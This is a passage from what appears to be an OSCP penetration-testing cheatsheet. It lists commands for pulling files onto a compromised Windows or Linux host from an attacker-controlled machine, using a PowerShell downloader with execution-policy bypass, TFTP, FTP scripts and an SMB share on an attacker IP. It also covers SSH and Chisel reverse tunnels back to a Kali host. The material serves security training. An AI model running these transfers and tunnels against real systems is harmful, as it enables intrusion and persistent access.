\u0026gt;\u0026gt; wget.ps1\r# Save file as\r$file = \u0026quot;file_name\u0026quot;\recho $webclient.DownloadFile($url,$file) \u0026gt;\u0026gt;wget.ps1\r# execute the script as follows\rpowershell.exe -nop -ep bypass -nol -noni -f wget.ps1\rTFTP (UDP) tftp -i \u0026lt;ip\u0026gt; get file_name\rSMB # cmd.exe\rnet use Z: \\\\\u0026lt;attacker_ip\u0026gt;\\share_name\r# To access the drive\rZ:\r# PowerShell\rNew-PSDrive -Name \u0026quot;notmalicious\u0026quot; -PSProvider \u0026quot;FileSystem\u0026quot; -Root \u0026quot;\\\\attacker_ip\\share_name\u0026quot;\r# To access the drive\rnotmalicious:\rFTP ftp \u0026lt;ip\u0026gt;\rftp\u0026gt;binary\rftp\u0026gt;get file_name\r# One-liner downloader\r# in cmd.exe do not use quotes in an echo command\recho open \u0026lt;ip\u0026gt; \u0026gt;\u0026gt; download.txt\recho anonymous \u0026gt;\u0026gt; download.txt\recho anon \u0026gt;\u0026gt; download.txt\recho binary \u0026gt;\u0026gt; download.txt\rget file_name \u0026gt;\u0026gt; download.txt\rbye \u0026gt;\u0026gt; download.txt\rftp -s:download.txt\rPort Forwarding Linux Local port forwarding ssh \u0026lt;gateway\u0026gt; -L \u0026lt;local_port_to_listen_to\u0026gt;:\u0026lt;remote_host\u0026gt;:\u0026lt;remote_port\u0026gt;\rRemote port forwarding ssh \u0026lt;gateway\u0026gt; -R \u0026lt;remote_port\u0026gt;:\u0026lt;local_host\u0026gt;:\u0026lt;local_port\u0026gt;\rDynamic port forwarding ssh -D \u0026lt;local proxy port\u0026gt; -p \u0026lt;remote port\u0026gt; \u0026lt;target\u0026gt;\rWindows Chisel is a port forwarding tool for Linux as well as Windows, works over HTTP and can be found here.\n# On KALI\r./chisel server --reverse --port 9001\r# On Windows\r.\\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT\rPrivilege Escalation Windows Local enumeration + privilege escalation available here\nLinux Local enumeration + privilege escalation available here\n","permalink":"http://localhost:1313/oscp-cheatsheet/","title":"OSCP Cheatsheet"}]